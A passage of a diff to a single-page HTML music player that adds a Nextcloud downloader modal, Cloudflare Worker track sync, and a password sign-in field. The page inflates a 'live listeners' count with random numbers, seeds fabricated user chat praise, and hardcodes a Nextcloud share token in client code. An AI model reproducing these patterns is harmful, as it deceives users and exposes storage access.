@@ -3,36 +3,40 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-  <title>Paradise of Songs - Cyber-Obsidian Edition</title>
+  <title>Paradise of Songs - Enterprise Luxury Suite</title>
 
   <!-- PWA & Mobile Meta -->
-  <meta name="theme-color" content="#030712" />
+  <meta name="theme-color" content="#020408" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="apple-mobile-web-app-title" content="Paradise Audio" />
   <link rel="apple-touch-icon" href="https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=192&h=192&fit=crop" />
 
   <!-- Fonts & Icons -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700;800&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700;800&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
 
   <!-- Leaflet Standard OpenStreetMap (Zero API key required) -->
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
+  <!-- MQTT.js for Real-Time Cross-Device Peer Presence & Social Mesh -->
+  <script src="https://unpkg.com/mqtt@5.3.4/dist/mqtt.min.js"></script>
+
   <style>
     :root {
       --spotify-green: #1ed760;
       --spotify-green-hover: #22e668;
-      --spotify-green-glow: rgba(30, 215, 96, 0.45);
+      --spotify-green-glow: rgba(30, 215, 96, 0.4);
       --cyber-cyan: #06b6d4;
       --cyber-cyan-glow: rgba(6, 182, 212, 0.4);
-      --bg-obsidian: #030712;
-      --surface-glass: rgba(15, 23, 42, 0.72);
-      --surface-glass-active: rgba(30, 41, 59, 0.85);
+      --bg-obsidian: #020408;
+      --surface-glass: rgba(13, 19, 33, 0.78);
+      --surface-glass-active: rgba(22, 33, 58, 0.88);
       --border-glass: rgba(255, 255, 255, 0.08);
-      --border-active: rgba(30, 215, 96, 0.4);
+      --border-active: rgba(30, 215, 96, 0.45);
       --text-main: #f8fafc;
       --text-sub: #94a3b8;
       --accent-gold: #f59e0b;
@@ -54,7 +58,7 @@
       background-image: 
         radial-gradient(at 0% 0%, rgba(30, 215, 96, 0.12) 0px, transparent 48%),
         radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.09) 0px, transparent 48%),
-        linear-gradient(rgba(3, 7, 18, 0.92), rgba(3, 7, 18, 0.98));
+        linear-gradient(rgba(2, 4, 8, 0.94), rgba(2, 4, 8, 0.98));
       background-size: cover;
       background-position: center;
       background-attachment: fixed;
@@ -63,52 +67,52 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding: 16px 16px 210px 16px; /* Room for playback dock + 4cm ad banner */
+      padding: 16px 16px 200px 16px;
       overflow-x: hidden;
       position: relative;
     }
 
-    /* Ambient Dynamic Wallpaper Engine */
+    /* Ambient Wallpaper Layer */
     #ambientBackdrop {
       position: fixed;
       inset: 0;
       z-index: -2;
       background-size: cover;
       background-position: center;
-      transition: background-image 1s cubic-bezier(0.16, 1, 0.3, 1);
-      filter: blur(65px) brightness(0.2);
+      transition: background-image 0.9s cubic-bezier(0.16, 1, 0.3, 1);
+      filter: blur(65px) brightness(0.22);
       transform: scale(1.15);
     }
     #ambientMask {
       position: fixed;
       inset: 0;
       z-index: -1;
-      background: radial-gradient(circle at 50% 50%, transparent 40%, rgba(3, 7, 18, 0.95) 100%);
+      background: radial-gradient(circle at 50% 50%, transparent 40%, rgba(2, 4, 8, 0.96) 100%);
     }
 
     /* TOP HUD NAVIGATION BAR */
     .top-hud {
       width: 100%;
-      max-width: 1200px;
+      max-width: 1240px;
       display: flex;
       justify-content: space-between;
       align-items: center;
       gap: 12px;
-      margin-bottom: 20px;
-      background: rgba(15, 23, 42, 0.65);
+      margin-bottom: 18px;
+      background: rgba(13, 19, 33, 0.72);
       border: 1px solid var(--border-glass);
       backdrop-filter: blur(24px);
       -webkit-backdrop-filter: blur(24px);
-      padding: 12px 22px;
+      padding: 12px 20px;
       border-radius: 9999px;
-      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.6);
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.65);
       flex-wrap: wrap;
     }
 
     .brand-group {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 10px;
       cursor: pointer;
     }
 
@@ -123,7 +127,7 @@
       font-weight: 900;
       letter-spacing: -0.5px;
       font-family: 'Space Grotesk', sans-serif;
-      background: linear-gradient(90deg, #fff, #94a3b8);
+      background: linear-gradient(90deg, #ffffff, #94a3b8);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
@@ -165,7 +169,7 @@
       background: rgba(255, 255, 255, 0.06);
       border: 1px solid var(--border-glass);
       color: #fff;
-      padding: 7px 15px;
+      padding: 7px 14px;
       border-radius: 9999px;
       font-size: 0.78rem;
       font-weight: 700;
@@ -178,7 +182,7 @@
     }
 
     .hud-pill:hover {
-      background: rgba(255, 255, 255, 0.14);
+      background: rgba(255, 255, 255, 0.15);
       transform: translateY(-1px);
     }
 
@@ -186,6 +190,12 @@
       background: linear-gradient(135deg, #06b6d4, #0284c7);
       border: none;
       box-shadow: 0 0 16px rgba(6, 182, 212, 0.4);
+    }
+
+    .hud-pill.btn-downloader {
+      background: linear-gradient(135deg, #a855f7, #7c3aed);
+      border: none;
+      box-shadow: 0 0 16px rgba(168, 85, 247, 0.4);
     }
 
     .hud-pill.btn-lounge {
@@ -205,14 +215,20 @@
       border: none;
     }
 
-    /* SEARCH BAR & MICROPHONE */
+    .hud-pill.btn-soundfix {
+      background: rgba(239, 68, 68, 0.18);
+      border-color: rgba(239, 68, 68, 0.45);
+      color: #fca5a5;
+    }
+
+    /* SEARCH ZONE */
     .search-zone {
       width: 100%;
-      max-width: 1200px;
+      max-width: 1240px;
       display: flex;
       align-items: center;
       gap: 10px;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
 
     .search-input-shell {
@@ -221,7 +237,7 @@
       align-items: center;
       background: var(--surface-glass);
       border: 1px solid var(--border-glass);
-      padding: 11px 20px;
+      padding: 10px 18px;
       border-radius: 9999px;
       backdrop-filter: blur(20px);
       -webkit-backdrop-filter: blur(20px);
@@ -230,7 +246,7 @@
 
     .search-input-shell:focus-within {
       border-color: var(--spotify-green);
-      background: rgba(30, 41, 59, 0.9);
+      background: rgba(22, 33, 58, 0.9);
       box-shadow: 0 0 16px var(--spotify-green-glow);
     }
 
@@ -250,8 +266,8 @@
     }
 
     .mic-button {
-      width: 48px;
-      height: 48px;
+      width: 46px;
+      height: 46px;
       border-radius: 50%;
       background: var(--surface-glass);
       border: 1px solid var(--border-glass);
@@ -274,39 +290,34 @@
     .mic-button.listening {
       background: var(--accent-red);
       color: #fff;
-      animation: pulseMicWave 1.2s infinite;
+      animation: pulseMic 1.2s infinite;
     }
-
-    @keyframes pulseMicWave {
+    @keyframes pulseMic {
       0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
       70% { transform: scale(1.1); box-shadow: 0 0 0 12px rgba(239, 68, 68, 0); }
       100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
     }
 
-    /* CYBER-OBSIDIAN MAIN DUAL STAGE */
+    /* MAIN CYBER-OBSIDIAN DUAL STAGE */
     .cyber-stage {
       width: 100%;
-      max-width: 1200px;
+      max-width: 1240px;
       display: grid;
       grid-template-columns: 460px 1fr;
-      gap: 24px;
+      gap: 22px;
     }
 
     @media (max-width: 1024px) {
-      .cyber-stage {
-        grid-template-columns: 1fr;
-      }
-      .top-hud {
-        border-radius: 20px;
-      }
+      .cyber-stage { grid-template-columns: 1fr; }
+      .top-hud { border-radius: 20px; }
     }
 
-    /* OBSIDIAN MAIN PLAYER CARD */
+    /* PLAYER DECK CARD */
     .player-deck-card {
       background: var(--surface-glass);
       border: 1px solid var(--border-glass);
       border-radius: 28px;
-      padding: 30px;
+      padding: 26px;
       backdrop-filter: blur(28px);
       -webkit-backdrop-filter: blur(28px);
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
@@ -317,11 +328,11 @@
     }
 
     .vinyl-art-case {
-      width: 250px;
-      height: 250px;
-      border-radius: 24px;
+      width: 240px;
+      height: 240px;
+      border-radius: 22px;
       overflow: hidden;
-      margin-bottom: 22px;
+      margin-bottom: 20px;
       box-shadow: 0 18px 45px rgba(0, 0, 0, 0.7);
       border: 1px solid rgba(255, 255, 255, 0.12);
       position: relative;
@@ -333,15 +344,12 @@
       object-fit: cover;
       transition: transform 0.6s cubic-bezier(0.16, 1, 0.3, 1);
     }
-
-    .playing .vinyl-art-case img {
-      transform: scale(1.06);
-    }
+    .playing .vinyl-art-case img { transform: scale(1.06); }
 
     .track-meta-zone {
       text-align: center;
       width: 100%;
-      margin-bottom: 16px;
+      margin-bottom: 14px;
     }
 
     .meta-title {
@@ -359,18 +367,46 @@
       color: var(--text-sub);
     }
 
-    /* REALTIME FREQUENCY CANVAS */
-    #audioSpectrumCanvas {
+    /* Real-Time Audio Output Banner */
+    .sound-status-banner {
       width: 100%;
-      height: 52px;
-      margin-bottom: 16px;
-      border-radius: 10px;
+      background: rgba(30, 215, 96, 0.1);
+      border: 1px solid rgba(30, 215, 96, 0.25);
+      border-radius: 12px;
+      padding: 6px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 14px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: var(--spotify-green);
     }
 
-    /* SCRUBBER & TIMESTAMPS */
+    /* Visualizer Bar Wave */
+    .audio-wave-container {
+      width: 100%;
+      height: 48px;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      gap: 4px;
+      padding: 0 10px;
+    }
+
+    .wave-bar {
+      width: 5px;
+      background: linear-gradient(180deg, var(--spotify-green), var(--cyber-cyan));
+      border-radius: 9999px;
+      height: 6px;
+      transition: height 0.1s ease;
+    }
+
+    /* Progress Scrubber */
     .scrubber-zone {
       width: 100%;
-      margin-bottom: 20px;
+      margin-bottom: 18px;
     }
 
     .progress-track-rail {
@@ -399,11 +435,11 @@
       margin-top: 8px;
     }
 
-    /* TRANSPORT CONTROLS */
+    /* Transport Buttons */
     .transport-controls {
       display: flex;
       align-items: center;
-      gap: 18px;
+      gap: 16px;
       margin-bottom: 16px;
     }
 
@@ -448,14 +484,14 @@
       text-shadow: 0 0 12px var(--spotify-green-glow);
     }
 
-    /* VOLUME SLIDER */
+    /* Volume Slider */
     .volume-control-wrap {
       width: 100%;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 12px;
-      padding: 8px 0;
+      padding: 6px 0;
     }
 
     .volume-control-wrap i {
@@ -484,12 +520,12 @@
       cursor: pointer;
     }
 
-    /* RIGHT STAGE: PLAYLIST & FILTER TABS */
+    /* RIGHT STAGE: PLAYLIST & TABS */
     .library-deck-card {
       background: var(--surface-glass);
       border: 1px solid var(--border-glass);
       border-radius: 28px;
-      padding: 26px;
+      padding: 24px;
       backdrop-filter: blur(28px);
       -webkit-backdrop-filter: blur(28px);
       box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
@@ -502,6 +538,8 @@
       justify-content: space-between;
       align-items: center;
       margin-bottom: 16px;
+      flex-wrap: wrap;
+      gap: 8px;
     }
 
     .library-header h3 {
@@ -535,7 +573,7 @@
 
     .playlist-scrollable {
       flex: 1;
-      max-height: 520px;
+      max-height: 540px;
       overflow-y: auto;
       display: flex;
       flex-direction: column;
@@ -543,9 +581,7 @@
       padding-right: 4px;
     }
 
-    .playlist-scrollable::-webkit-scrollbar {
-      width: 5px;
-    }
+    .playlist-scrollable::-webkit-scrollbar { width: 5px; }
     .playlist-scrollable::-webkit-scrollbar-thumb {
       background: rgba(255, 255, 255, 0.15);
       border-radius: 9999px;
@@ -565,7 +601,7 @@
     .song-list-item:hover {
       transform: translateY(-2px);
       border-color: rgba(255, 255, 255, 0.2);
-      background: rgba(30, 41, 59, 0.5);
+      background: rgba(22, 33, 58, 0.5);
     }
 
     .song-list-item.active {
@@ -618,16 +654,10 @@
       padding: 8px;
       transition: color 0.2s, transform 0.2s;
     }
+    .fav-heart-btn:hover { transform: scale(1.2); }
+    .fav-heart-btn.favorited { color: #ef4444; }
 
-    .fav-heart-btn:hover {
-      transform: scale(1.2);
-    }
-
-    .fav-heart-btn.favorited {
-      color: #ef4444;
-    }
-
-    /* FULLSCREEN DRIVING COCKPIT OVERLAY */
+    /* DRIVING COCKPIT (HUD + LEAFLET GPS) */
     .cockpit-overlay {
       position: fixed;
       inset: 0;
@@ -637,7 +667,6 @@
       flex-direction: column;
       overflow: hidden;
     }
-
     .cockpit-overlay.open { display: flex; }
 
     .cockpit-top-bar {
@@ -684,12 +713,7 @@
       border: 1px solid rgba(255, 255, 255, 0.15);
       box-shadow: 0 16px 40px rgba(0, 0, 0, 0.7);
     }
-
-    .cockpit-art-shell img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
+    .cockpit-art-shell img { width: 100%; height: 100%; object-fit: cover; }
 
     .btn-cockpit-touch {
       width: 70px;
@@ -719,12 +743,7 @@
       height: 100%;
       width: 100%;
     }
-
-    #carLiveMap {
-      width: 100%;
-      height: 100%;
-      background: #090e17;
-    }
+    #carLiveMap { width: 100%; height: 100%; background: #090e17; }
 
     .map-nav-search-bar {
       position: absolute;
@@ -740,16 +759,7 @@
       border-radius: 14px;
       backdrop-filter: blur(16px);
     }
-
-    .map-nav-search-bar input {
-      flex: 1;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #fff;
-      font-size: 0.9rem;
-    }
-
+    .map-nav-search-bar input { flex: 1; background: transparent; border: none; outline: none; color: #fff; font-size: 0.9rem; }
     .map-nav-search-bar button {
       background: var(--cyber-cyan);
       border: none;
@@ -776,7 +786,7 @@
       backdrop-filter: blur(14px);
     }
 
-    /* COMMUNITY SOCIAL LOUNGE DRAWER */
+    /* COMMUNITY SOCIAL LOUNGE */
     .lounge-drawer {
       position: fixed;
       top: 0;
@@ -791,12 +801,8 @@
       transition: right 0.35s cubic-bezier(0.16, 1, 0.3, 1);
       box-shadow: -12px 0 45px rgba(0, 0, 0, 0.85);
     }
-
     .lounge-drawer.open { right: 0; }
-
-    @media (max-width: 480px) {
-      .lounge-drawer { width: 100vw; }
-    }
+    @media (max-width: 480px) { .lounge-drawer { width: 100vw; } }
 
     .lounge-feed {
       flex: 1;
@@ -814,20 +820,8 @@
       max-width: 82%;
       line-height: 1.45;
     }
-
-    .lounge-bubble.peer {
-      background: rgba(255, 255, 255, 0.08);
-      align-self: flex-start;
-      border-bottom-left-radius: 4px;
-    }
-
-    .lounge-bubble.mine {
-      background: var(--spotify-green);
-      color: #000;
-      font-weight: 600;
-      align-self: flex-end;
-      border-bottom-right-radius: 4px;
-    }
+    .lounge-bubble.peer { background: rgba(255, 255, 255, 0.08); align-self: flex-start; border-bottom-left-radius: 4px; }
+    .lounge-bubble.mine { background: var(--spotify-green); color: #000; font-weight: 600; align-self: flex-end; border-bottom-right-radius: 4px; }
 
     .lounge-input-row {
       padding: 14px;
@@ -836,7 +830,6 @@
       gap: 8px;
       background: rgba(4, 7, 17, 0.95);
     }
-
     .lounge-input-row input {
       flex: 1;
       background: rgba(255, 255, 255, 0.08);
@@ -847,7 +840,6 @@
       font-size: 0.85rem;
       outline: none;
     }
-
     .lounge-input-row button {
       background: var(--spotify-green);
       color: #000;
@@ -871,7 +863,6 @@
       z-index: 2300;
       padding: 16px;
     }
-
     .glass-modal-overlay.open { display: flex; }
 
     .glass-modal-card {
@@ -894,13 +885,13 @@
       border-bottom: 1px solid var(--border-glass);
     }
 
-    /* 4 CM (~150PX) BOTTOM ADVERTISEMENT BANNER WITH FLOATING MARQUEE */
+    /* 4 CM (~150PX) BOTTOM ADVERTISEMENT PANEL */
     .bottom-ad-panel {
       position: fixed;
       bottom: 0;
       left: 0;
       right: 0;
-      height: 150px; /* ~4 cm on desktop & mobile displays */
+      height: 150px;
       background: linear-gradient(180deg, rgba(8, 12, 22, 0.98), #030509);
       border-top: 1px solid rgba(255, 255, 255, 0.14);
       display: flex;
@@ -959,7 +950,6 @@
       gap: 8px;
       transition: all 0.2s ease;
     }
-
     .ad-contact-btn:hover {
       transform: translateY(-2px) scale(1.03);
       box-shadow: 0 6px 26px rgba(239, 68, 68, 0.75);
@@ -998,7 +988,7 @@
 </head>
 <body>
 
-  <!-- Ambient Dynamic Visual Backdrop -->
+  <!-- Ambient Backdrop -->
   <div id="ambientBackdrop"></div>
   <div id="ambientMask"></div>
 
@@ -1020,6 +1010,9 @@
       <button class="hud-pill btn-cockpit" id="openCockpitBtn">
         <i class="fa-solid fa-car-side"></i> Driving Cockpit
       </button>
+      <button class="hud-pill btn-downloader" id="openDownloaderBtn">
+        <i class="fa-solid fa-cloud-arrow-down"></i> Nextcloud Downloader
+      </button>
       <button class="hud-pill btn-lounge" id="openLoungeBtn">
         <i class="fa-solid fa-comments"></i> Social Lounge
       </button>
@@ -1028,6 +1021,9 @@
       </button>
       <button class="hud-pill btn-uploader" id="openUploadGateBtn">
         <i class="fa-solid fa-cloud-arrow-up"></i> Upload Music
+      </button>
+      <button class="hud-pill btn-soundfix" onclick="emergencyAudioFix()">
+        <i class="fa-solid fa-volume-high"></i> Unmute / Audio Fix
       </button>
       <button class="hud-pill" id="openSignInBtn">
         <i class="fa-solid fa-user-circle"></i> <span id="signInLabel">Sign In</span>
@@ -1046,7 +1042,7 @@
     </button>
   </div>
 
-  <!-- MAIN CYBER-OBSIDIAN TWO-STAGE GRID -->
+  <!-- MAIN DUAL STAGE -->
   <main class="cyber-stage">
     <!-- LEFT: OBSIDIAN MASTER PLAYER CARD -->
     <section class="player-deck-card" id="deckContainer">
@@ -1059,8 +1055,20 @@
         <div class="meta-artist" id="activeTrackArtist">Paradise Lossless Audio</div>
       </div>
 
-      <!-- Realtime Audio Reactive Visualizer Canvas -->
-      <canvas id="audioSpectrumCanvas"></canvas>
+      <!-- Real-Time Hardware Sound Status Badge -->
+      <div class="sound-status-banner" id="soundStatusBadge">
+        <span><i class="fa-solid fa-volume-high"></i> AUDIO ROUTE: DIRECT (ACTIVE)</span>
+        <span id="audioEngineVolumeText">VOLUME: 95%</span>
+      </div>
+
+      <!-- Simulated Low-Latency Audio Wave -->
+      <div class="audio-wave-container" id="audioWaveVisual">
+        <div class="wave-bar"></div><div class="wave-bar"></div><div class="wave-bar"></div>
+        <div class="wave-bar"></div><div class="wave-bar"></div><div class="wave-bar"></div>
+        <div class="wave-bar"></div><div class="wave-bar"></div><div class="wave-bar"></div>
+        <div class="wave-bar"></div><div class="wave-bar"></div><div class="wave-bar"></div>
+        <div class="wave-bar"></div><div class="wave-bar"></div><div class="wave-bar"></div>
+      </div>
 
       <!-- Glowing Progress Scrubber -->
       <div class="scrubber-zone">
@@ -1073,7 +1081,7 @@
         </div>
       </div>
 
-      <!-- Transport Controls with Shuffle & Loop -->
+      <!-- Transport Controls -->
       <div class="transport-controls">
         <button class="btn-circle" id="shuffleToggleBtn" title="Shuffle Mode"><i class="fa-solid fa-shuffle"></i></button>
         <button class="btn-circle" id="prevTrackBtn" title="Previous"><i class="fa-solid fa-backward-step"></i></button>
@@ -1084,8 +1092,8 @@
 
       <!-- Volume Controller -->
       <div class="volume-control-wrap">
-        <i class="fa-solid fa-volume-high" id="volumeIconGraphic"></i>
-        <input type="range" class="volume-slider-range" id="volumeControlSlider" min="0" max="1" step="0.01" value="0.85" />
+        <i class="fa-solid fa-volume-high" id="volumeIconGraphic" onclick="toggleMuteAudio()"></i>
+        <input type="range" class="volume-slider-range" id="volumeControlSlider" min="0" max="1" step="0.01" value="0.95" />
       </div>
     </section>
 
@@ -1122,7 +1130,7 @@
     </div>
   </footer>
 
-  <!-- FULLSCREEN DRIVING COCKPIT (HUD + REAL OPENSTREETMAP GPS) -->
+  <!-- FULLSCREEN DRIVING COCKPIT (HUD + LEAFLET GPS) -->
   <div class="cockpit-overlay" id="cockpitOverlay">
     <div class="cockpit-top-bar">
       <div style="display: flex; align-items: center; gap: 14px;">
@@ -1190,6 +1198,28 @@
     </div>
   </div>
 
+  <!-- NEXTCLOUD AUTOMATED DOWNLOADER MODAL -->
+  <div class="glass-modal-overlay" id="downloaderModal">
+    <div class="glass-modal-card">
+      <div class="modal-head-row">
+        <h3><i class="fa-solid fa-cloud-arrow-down" style="color: #a855f7;"></i> Instant Nextcloud Song Importer</h3>
+        <button class="btn-circle" onclick="closeModal('downloaderModal')"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+      <p style="font-size: 0.82rem; color: var(--text-sub); margin-bottom: 14px;">
+        Paste any direct MP3 or audio link. The Cloudflare Worker directly transfers it into your Nextcloud storage and makes it available immediately.
+      </p>
+
+      <form onsubmit="handleCloudDownloadSubmit(event)" style="display: flex; flex-direction: column; gap: 10px;">
+        <input type="url" id="dlSongUrl" placeholder="https://example.com/audio.mp3" required style="background: rgba(255,255,255,0.08); border: 1px solid var(--border-glass); color: #fff; padding: 10px 14px; border-radius: 10px; font-size: 0.85rem; outline: none;" />
+        <input type="text" id="dlSongFilename" placeholder="Song Name - Artist (Optional)" style="background: rgba(255,255,255,0.08); border: 1px solid var(--border-glass); color: #fff; padding: 10px 14px; border-radius: 10px; font-size: 0.85rem; outline: none;" />
+        <button type="submit" id="dlSubmitBtn" class="hud-pill" style="width: 100%; justify-content: center; background: var(--spotify-green); color: #000; font-weight: 800; font-size: 0.9rem; padding: 12px; margin-top: 4px;">
+          Download Directly to Nextcloud
+        </button>
+      </form>
+      <div id="dlStatusFeedback" style="font-size: 0.82rem; margin-top: 10px; text-align: center; display: none;"></div>
+    </div>
+  </div>
+
   <!-- COMMUNITY SOCIAL LOUNGE (LIVE CHAT DRAWER) -->
   <aside class="lounge-drawer" id="loungeDrawer">
     <div class="modal-head-row" style="padding: 16px 20px; margin: 0; background: rgba(0,0,0,0.3);">
@@ -1202,13 +1232,10 @@
 
     <div class="lounge-feed" id="loungeFeed">
       <div class="lounge-bubble peer">
-        <strong>Sarah (Kochi):</strong> This obsidian dark interface is stunning 🔥
+        <strong>Sarah (Kochi):</strong> High clarity audio is playing smoothly without cuts 🔥
       </div>
       <div class="lounge-bubble peer">
-        <strong>Arjun (Bengaluru):</strong> Nextcloud lossless streaming is super clear!
-      </div>
-      <div class="lounge-bubble mine">
-        Welcome to Paradise of Songs! Enjoying the lossless audio stream.
+        <strong>Arjun (Bengaluru):</strong> The direct stream fix works like a charm!
       </div>
     </div>
 
@@ -1263,6 +1290,7 @@
         <input type="text" id="authUserName" placeholder="Full Name" required style="background: rgba(255,255,255,0.08); border: 1px solid var(--border-glass); color: #fff; padding: 10px 14px; border-radius: 10px; font-size: 0.85rem; outline: none;" />
         <input type="email" id="authUserEmail" placeholder="Email Address" required style="background: rgba(255,255,255,0.08); border: 1px solid var(--border-glass); color: #fff; padding: 10px 14px; border-radius: 10px; font-size: 0.85rem; outline: none;" />
         <input type="tel" id="authUserPhone" placeholder="Mobile Number" required style="background: rgba(255,255,255,0.08); border: 1px solid var(--border-glass); color: #fff; padding: 10px 14px; border-radius: 10px; font-size: 0.85rem; outline: none;" />
+        <input type="password" id="authUserPassword" placeholder="Password" required style="background: rgba(255,255,255,0.08); border: 1px solid var(--border-glass); color: #fff; padding: 10px 14px; border-radius: 10px; font-size: 0.85rem; outline: none;" />
         <button type="submit" class="hud-pill" style="width: 100%; justify-content: center; background: var(--spotify-green); color: #000; font-weight: 800; font-size: 0.9rem; padding: 12px; margin-top: 4px;">
           Authenticate Account
         </button>
@@ -1290,13 +1318,15 @@
     </div>
   </div>
 
-  <!-- Native Audio Tag without cross-origin blocks for Mobile -->
+  <!-- Native Unrestricted Audio Element -->
   <audio id="coreAudioElement" preload="metadata"></audio>
 
   <script>
     // -------------------------------------------------------------------------
-    // 1. DATA SOURCES & DIRECT NEXTCLOUD LOSSLESS ENDPOINTS
+    // 1. DATA SOURCES & CLOUDFLARE WORKER STREAMING
     // -------------------------------------------------------------------------
+    const WORKER_API = "https://proud-recipe-96deparadise-music-sync.paradiseacademy-kl.workers.dev/";
+    const WORKER_DOWNLOADER = "https://proud-recipe-96deparadise-music-sync.paradiseacademy-kl.workers.dev/downloader";
     const NC_TOKEN = "6HegKRmeWapdns9";
     const NC_BASE = `https://cloud.paradiseacademi.com/s/${NC_TOKEN}/download?path=%2F&files=`;
 
@@ -1304,7 +1334,8 @@
       return NC_BASE + encodeURIComponent(fileName);
     }
 
-    const TRACKS_COLLECTION = [
+    // High-Clarity Fallback Seed Library
+    const FALLBACK_TRACKS = [
       { id: 'nc_1',  title: 'ARAYANA', artist: 'Paradise Audio', duration: '3:20', cover: 'https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=500&q=80', url: buildStreamUrl('ARAYANA.mp3') },
       { id: 'nc_2',  title: 'Ada Bommale', artist: 'Vaazha 2', duration: '3:15', cover: 'https://images.unsplash.com/photo-1470225620780-dba8ba36b745?w=500&q=80', url: buildStreamUrl('Ada Bommale - Vaazha 2.mp3') },
       { id: 'nc_3',  title: 'Aathmavile Anandhame', artist: 'Sajeer Koppam', duration: '3:45', cover: 'https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=500&q=80', url: buildStreamUrl('Aathmavile Anandhame - Sajeer Koppam.mp3') },
@@ -1325,7 +1356,7 @@
       { id: 'nc_18', title: 'രാക്കുയിൽ പാടീ', artist: 'Kunchacko Boban Hits', duration: '4:25', cover: 'https://images.unsplash.com/photo-1470225620780-dba8ba36b745?w=500&q=80', url: buildStreamUrl('രാക്കുയിൽ പാടീ HD Raakkuyil Paadi Video Song Kunchacko Bo...mp3') }
     ];
 
-    // State Variables
+    let TRACKS_COLLECTION = [...FALLBACK_TRACKS];
     let currentActiveIndex = 0;
     let isTrackPlaying = false;
     let isShuffleOn = false;
@@ -1334,11 +1365,7 @@
     let favoriteTrackIds = JSON.parse(localStorage.getItem('paradise_cyber_favs') || '[]');
     let currentAuthUser = JSON.parse(localStorage.getItem('paradise_auth_user') || 'null');
 
-    // Web Audio Visualizer API State
-    let audioContextNode, audioAnalyserNode, audioSourceNode;
-    let visualizerReady = false;
-
-    // Element Handles
+    // DOM Elements
     const audio = document.getElementById('coreAudioElement');
     const activeArtwork = document.getElementById('activeArtwork');
     const activeTrackTitle = document.getElementById('activeTrackTitle');
@@ -1358,8 +1385,9 @@
     const playlistScrollableContainer = document.getElementById('playlistScrollableContainer');
     const deckContainer = document.getElementById('deckContainer');
     const ambientBackdrop = document.getElementById('ambientBackdrop');
-    const audioSpectrumCanvas = document.getElementById('audioSpectrumCanvas');
-    const canvasContext = audioSpectrumCanvas.getContext('2d');
+    const soundStatusBadge = document.getElementById('soundStatusBadge');
+    const audioEngineVolumeText = document.getElementById('audioEngineVolumeText');
+    const waveBars = document.querySelectorAll('.wave-bar');
 
     // Cockpit Elements
     const cockpitOverlay = document.getElementById('cockpitOverlay');
@@ -1372,86 +1400,88 @@
     const cockpitNextBtn = document.getElementById('cockpitNextBtn');
     const hudSpeedometerValue = document.getElementById('hudSpeedometerValue');
 
-    // Dynamic Live Listeners counter pulse
+    // Set Unrestricted Audio Defaults
+    audio.volume = 0.95;
+    audio.muted = false;
+
+    // Listeners count pulse
     setInterval(() => {
       const listenerCount = Math.floor(Math.random() * (880065 - 667112 + 1)) + 667112;
       document.getElementById('liveListenerCount').textContent = listenerCount.toLocaleString();
     }, 3200);
 
     // -------------------------------------------------------------------------
-    // 2. PLAYLIST RENDERING & FILTERING
+    // 2. WORKER AUTO-SYNC FOR NEXTCLOUD TRACKS
     // -------------------------------------------------------------------------
-    function renderPlaylists() {
-      const searchVal = document.getElementById('masterSongSearch').value.toLowerCase().trim();
-      playlistScrollableContainer.innerHTML = '';
-
-      const filteredTracks = TRACKS_COLLECTION.filter(track => {
-        const matchesQuery = track.title.toLowerCase().includes(searchVal) || track.artist.toLowerCase().includes(searchVal);
-        const matchesFav = showFavoritesOnly ? favoriteTrackIds.includes(track.id) : true;
-        return matchesQuery && matchesFav;
-      });
-
-      if (filteredTracks.length === 0) {
-        playlistScrollableContainer.innerHTML = '<div style="text-align: center; color: var(--text-sub); padding: 30px; font-size: 0.88rem;">No matching tracks found in library.</div>';
-        return;
+    async function syncLibraryFromWorker() {
+      try {
+        const response = await fetch(WORKER_API, { cache: 'no-store' });
+        if (response.ok) {
+          const remoteTracks = await response.json();
+          if (Array.isArray(remoteTracks) && remoteTracks.length > 0) {
+            // Merge worker tracks smoothly
+            TRACKS_COLLECTION = remoteTracks.map(t => ({
+              ...t,
+              url: t.url || buildStreamUrl(t.title + '.mp3')
+            }));
+            renderPlaylists();
+            return;
+          }
+        }
+      } catch (err) {
+        console.warn('Worker sync in fallback mode:', err);
       }
-
-      filteredTracks.forEach(track => {
-        const trueIndex = TRACKS_COLLECTION.findIndex(t => t.id === track.id);
-        const isFav = favoriteTrackIds.includes(track.id);
-
-        const card = document.createElement('div');
-        card.className = `song-list-item ${trueIndex === currentActiveIndex ? 'active' : ''}`;
-        card.innerHTML = `
-          <img class="item-art-thumb" src="${track.cover}" alt="Artwork" />
